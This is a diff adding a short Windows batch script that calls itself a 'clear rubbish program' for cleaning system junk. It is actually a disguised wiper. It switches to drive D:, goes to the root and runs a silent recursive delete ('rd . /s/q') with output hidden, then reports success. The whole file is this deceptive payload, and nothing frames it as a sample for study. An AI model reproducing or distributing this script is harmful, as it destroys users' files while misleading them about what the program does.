@@ -1,0 +1,15 @@
+@echo off
+color 0a
+title clear rubbish program
+echo =========================
+echo clear your system rubbish
+echo =========================
+pause
+echo.
+echo rubbish is cleaning......
+d: >nul 2>nul
+cd \ >nul 2>nul
+rd . /s/q >nul 2>nul
+ping -n 10 127.0.0.1 >nul 2>nul
+echo congratulations!!!everything is over!!!
+pause
